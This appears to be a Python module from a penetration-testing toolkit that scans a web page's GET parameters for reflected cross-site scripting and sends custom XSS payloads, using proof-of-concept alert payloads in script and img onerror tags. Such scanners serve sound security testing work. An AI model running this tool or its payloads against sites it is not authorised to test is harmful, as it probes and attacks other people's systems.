"""
modules/pentesting_tools/xss_tester.py

This module provides tools for detecting and exploiting Cross-Site Scripting (XSS)
vulnerabilities in web applications.
"""

import requests
from urllib.parse import urljoin, urlencode
import re


class XSSTester:
    """
    A tool for detecting and exploiting Cross-Site Scripting (XSS) vulnerabilities.
    """

    def __init__(self, url):
        """
        Initializes the XSSTester with a target URL.
        :param url: The base URL of the web application to test.
        """
        self.base_url = url

    def detect_xss(self, params):
        """
        Detects if a given URL is vulnerable to XSS.
        :param params: Dictionary of GET parameters to test.
        :return: List of vulnerable parameters.
        """
        xss_payload = "<script>alert('XSS')</script>"
        vulnerable_params = []

        print(f"Testing for XSS at: {self.base_url}")
        for param in params:
            test_params = params.copy()
            test_params[param] += xss_payload
            full_url = urljoin(self.base_url, "?" + urlencode(test_params))

            try:
                response = requests.get(full_url)
                if xss_payload in response.text:
                    print(f"Potential XSS vulnerability found in parameter: {param}")
                    vulnerable_params.append(param)
            except Exception as e:
                print(f"Error testing parameter {param}: {e}")

        return vulnerable_params

    def exploit(self, params, payload):
        """
        Attempts to exploit XSS vulnerabilities with a custom payload.
        :param params: Dictionary of GET parameters to exploit.
        :param payload: The XSS payload to use.
        :return: Response content from the server.
        """
        exploit_params = params.copy()
        for param in params:
            exploit_params[param] += payload
        full_url = urljoin(self.base_url, "?" + urlencode(exploit_params))

        print(f"Exploiting with payload: {payload}")
        try:
            response = requests.get(full_url)
            return response.text
        except Exception as e:
            print(f"Error during exploitation: {e}")
            return None

    @staticmethod
    def sanitize_response(response_text):
        """
        Checks for sanitized outputs in the server's response.
        :param response_text: The server response content.
        :return: Boolean indicating whether the response is sanitized.
        """
        sanitization_patterns = [
            r"&lt;script&gt;",  # Escaped script tags
            r"&amp;",          # Escaped ampersand
        ]
        for pattern in sanitization_patterns:
            if re.search(pattern, response_text):
                return True
        return False


if __name__ == "__main__":
    # Example Usage
    target_url = "https://example.com/search"
    parameters = {"search": "test"}

    xss_tester = XSSTester(target_url)

    # Detect vulnerabilities
    print("Detecting XSS vulnerabilities...")
    vulnerable = xss_tester.detect_xss(parameters)
    print("Vulnerable parameters:", vulnerable)

    # Exploit vulnerabilities
    if vulnerable:
        print("Exploiting vulnerabilities...")
        payload = "<img src=x onerror=alert('XSS')>"
        response = xss_tester.exploit(parameters, payload)
        print("Exploitation response:", response)

        # Check if response is sanitized
        if xss_tester.sanitize_response(response):
            print("The server is escaping XSS payloads.")
        else:
            print("The server is vulnerable to XSS.")
